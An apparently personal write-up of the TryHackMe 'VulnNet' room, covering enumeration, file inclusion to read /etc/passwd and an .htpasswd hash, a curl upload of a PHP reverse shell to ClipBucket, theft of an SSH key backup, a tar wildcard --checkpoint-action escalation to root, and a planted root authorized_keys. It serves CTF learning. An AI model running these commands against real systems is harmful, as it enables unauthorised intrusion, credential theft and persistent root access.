---
title: "VulnNet"
date: 2025-3-6
draft: false
description: TryHackMe's Good Room
Tags:
- TryHackMe
- Linux
- Medium
---

## Enumeration

```
nmap -sVC 10.10.98.217            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 12:32 +0545
Nmap scan report for vulnnet.thm (10.10.98.217)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: VulnNet
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds


```


Lets enumerate port 80.

![](Pasted%20image%2020250306123404.png)

And login page.
![](Pasted%20image%2020250306123535.png)


Lets capture the login request in burp and see any vulnerabilities.
Nothing.
Hmm interesting.
![](Pasted%20image%2020250306124359.png)

Lets enumerate further.
![](Pasted%20image%2020250306124648.png)
![](Pasted%20image%2020250306124723.png)

Hmm.
![](Pasted%20image%2020250306124758.png)

Lets do vhost scan.
`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u "http://vulnnet.thm" -H "Host: FUZZ.vulnnet.thm" -fs 5829`

![](Pasted%20image%2020250306125133.png)

Lets also put that in `/etc/hosts`.
And again login.
![](Pasted%20image%2020250306125250.png)

I guess we have to use hydra.
This might be username but we are not sure.
![](Pasted%20image%2020250306125505.png)

But nothing worked.
After trying different things,i came to checking revealed .js files and saw this.
![](Pasted%20image%2020250306130308.png)
Hmmm interesting parameter.
Lets try to do something.
![](Pasted%20image%2020250306130416.png)

Hmm it might help us read files.
Lets see.
But nothing.
![](Pasted%20image%2020250306130519.png)

Hmm lets try to enumerate more.
![](Pasted%20image%2020250306130800.png)

Hmm lets try php wrappers.
![](Pasted%20image%2020250306131818.png)

Nothing worked.
But suddenly it worked.
![](Pasted%20image%2020250306131920.png)

Hmmm.interesting.
We have to see in source.
Okay.
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
```

We have one user and root user.
`server-management`.
Now lets search for creds and any other vulnerabilities.
![](Pasted%20image%2020250306132331.png)


And after enumerating we can find this.
![](Pasted%20image%2020250306132614.png)

Hmm we found the password hash of developers on `/etc/apache2/.htpasswd`.
Lets try to crack it.
`developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0`

And in background hydra also didn't worked.
![](Pasted%20image%2020250306132729.png)

So I stoped it.
And we could crack the hash.
![](Pasted%20image%2020250306132856.png)

`developers:9972761drmfsls`

## Foothold

Lets try to login.
![](Pasted%20image%2020250306133008.png)

and we were successful.
And its using clipbucket.
Might be vulnerable.
[[https://www.exploit-db.com/exploits/44250]]

![](Pasted%20image%2020250306133155.png)

Hmm.
And my machine expired.
Lets do again.
:slight_smile:


Lets try to signup login and try to exploit the vulnerability.
After trying different POCs,this one worked.

`curl -u "developers:9972761drmfsls" -F "file=@shell.php" -F "plupload=1" -F "name=anyname.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php" `

![](Pasted%20image%2020250306135836.png)

So here what we did is used a poc.
![](Pasted%20image%2020250306135457.png)

And uploaded out file shell.php to get rev shell.
And you might wondering why we used username and password as it is Unauthenticated Arbitary file upload.
So we did so cause we have to login first to get to that **ClipBucket** thing.
So we did it to get there and done our work.
Now lets try to find a file and try to execute it.

and we can see the same directory in `/actions`.
![](Pasted%20image%2020250306135812.png)
![](Pasted%20image%2020250306135916.png)

Lets try to execute it and get rev shell.
![](Pasted%20image%2020250306135947.png)

And executing that gave us a reverse shell.
![](Pasted%20image%2020250306140031.png)

```
Note:you can upload a rev shell form revshell.com(perfer pentest monkey) or you can go here.

[php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

-you need to change the ip and port according to you.
```

So we got the shell.
Lets again enumerate.
But first of all,lets get a good stable shell.

[full tty shell](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)

```
1.python3 -c 'import pty; pty.spawn("/bin/bash")'
2.CTRL+Z
3.stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen

Now you have a stable shell.
```

![](Pasted%20image%2020250306140720.png)

## Privelege Escalation

Lets continue.
Lets try to find any setuid.
`find / -perm -4000 -type f 2>/dev/null`

And we got something interesting.
![](Pasted%20image%2020250306140959.png)

Hmm lets see.
But nothing usefull i guess.
Lets enumerate further.

and we can find lost more in `/var/www/html/`.
![](Pasted%20image%2020250306141356.png)

Lets see.
After enumerating those files we can find a db file.
`/var/www/html/includes/dbconnect.php`

And we got some interesting things.
**Passwords**
![](Pasted%20image%2020250306141812.png)

```
$DBNAME = 'VulnNet';
$DBUSER = 'admin';
$DBPASS = 'VulnNetAdminPass0990';
```
Lets login to mysql.
`mysql -u admin -p`
![](Pasted%20image%2020250306142112.png)

Lets see.
Hmm nothing interesting while enumerating databases.

Hmm do we missed something.

Lets again enumerate.
Ohh we missed something before at `/var/backups`
![](Pasted%20image%2020250306142535.png)

Okay but we cant unzip here.
So lets try to open python3 server and download to our local.

We can do so like this.
`python3 -m http.server 8900`

It opens a python3 web server and we can use it to transfer files.
`wget http://machine_ip:8900/ssh-backup.tar.gz`
![](Pasted%20image%2020250306142817.png)

Lets unzip it and see any interesting file.
And we got `id_rsa`.
![](Pasted%20image%2020250306142940.png)

`tar -xf ssh-backup.tar.gz`
So if you don't know we can use tar or gunzip to extract thing from zip file.

Lets login as user `server-management`.
But first we have to crack the passphrase.
So we are gonna use ssh2john here.
`ssh2john id_rsa > id_hash.txt`

![](Pasted%20image%2020250306143201.png)

And john to crack the hash.
`john --wordlist=/usr/share/wordlists/rockyou.txt id_hash.txt`

And it is crackable.
![](Pasted%20image%2020250306143312.png)
`oneTWO3gOyac`

Lets now login.
`ssh -i id_rsa server-management@10.10.2.38`

And we are in as user `server-management`.
![](Pasted%20image%2020250306143459.png)

Lets enumerate further to do privelege escalation.
And few pdfs.
![](Pasted%20image%2020250306143748.png)
Hmm interesting.

But we will surely see this if we don't find other interesting things.
But we can see crontab to see what is running is cron.

[cron](https://en.wikipedia.org/wiki/Cron)
you can check this.

And doing `cat /etc/crontab` revealed something.
![](Pasted%20image%2020250306144145.png)

So that script is running on cron with root priveleges.
Lets check that out.
![](Pasted%20image%2020250306144242.png)

Hmm so we should exploit this.

Hmm so what we are gonna do here is exploit that process.
`tar czf $dest/$archive_file $backup_files`

By `--checkpoint-action` feature of tar.
To understand this you can do chatGPT or can find many documents.

[Exploiting tar with wildcard](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)

this can explain it in detain.

And one more thing,we could exploit this because of the use of wildcard`*`.
So that wildcard will specify all files in a folder.

So lets start exploiting.
We gonna use `--checkpoint-action=exec` parameter to exploit.

So lets start.
```
1.echo "" > '--checkpoint=1'  
2.echo "" > '--checkpoint-action=exec=sh privesc.sh'
(it will create a file name those parameter used in tar to trick tar)
3.Create a malicious file privesc.sh which will be executed as root
we can create a simple line like this.
`chmod 4777 /bin/bash`
4.Now the cronjob will execute that script which contain a tar command doing its work.So it will be executes cause at last cause of out files the full tar command would look like this.
tar czf /var/backups/exploit_backup.tgz --checkpoint=1 --checkpoint-action=exec=sh /home/server-management/Documents/*
(which is executing our malicious .sh file which will help us in privelege escalation.)
5.Now we have to wait a bit and its done.

```

And we succeed.
![](Pasted%20image%2020250306150919.png)

Lets become root.
![](Pasted%20image%2020250306151024.png)

Now we are effectively root.
![](Pasted%20image%2020250306151111.png)

## Post-Exploitation

Now we can create `.ssh/autorized_keys` file and add our ssh public key there.

We can create ssh keys.
`ssh-keygen`

Now we need to do in `/root` directory.
```
1.mkdir .ssh
2.nano authorized_keys
3.read before created public key and add there.
4.and done now we could do ssh by our private key.
```

```
Note

we should change a permission of .ssh directory and authorized_keys file to 400.
chmod 400 .ssh && chmod 400 .ssh/authorized_keys
```

![](Pasted%20image%2020250306151720.png)

And we can now do ssh as root with a private key.
![](Pasted%20image%2020250306152340.png)

If you want to learn about private keys and public keys and how it works,you can check out this series.

[videos explaining private key and public key](https://www.youtube.com/watch?v=JV9Yei8QiP0) (more videos are coming soon).


## Done

And done.
![](Pasted%20image%2020250306152845.png)

I hope you also learned lots of things with me in this tryhackme room.
See you soon.

Happy Hacking! :)
